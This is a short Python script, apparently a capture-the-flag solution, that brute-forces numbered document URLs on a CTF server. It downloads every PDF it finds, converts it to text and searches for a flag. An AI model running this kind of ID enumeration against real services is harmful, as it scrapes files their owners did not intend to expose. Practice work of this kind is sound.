#!/usr/bin/env python3
import requests
import  os
url = 'http://hackfest.redrocket.club:31000/docs/document_'
addon = '00'
for i in range(0,1000):
	if(i==10):
		addon = '0'
	elif(i==100):
		addon = ''
	x = addon + str(i) + '.pdf'
	r = requests.get(url+x)
	if(r.status_code == 200):
		print('found pdf at ' + str(i))
		with open('pdfs/pdf'+str(i)+'.pdf', 'wb') as f:
    			f.write(r.content)
		os.system('pdftotext pdfs/pdf'+str(i)+'.pdf')
		with open('pdfs/pdf'+str(i)+'.txt','r') as f:
			text = f.read()
		if(text.find('flag{') != -1):
			print('Flag found')
			print('At pdf '+str(i))
			break
	else:
		print('didnt find at' + str(i))
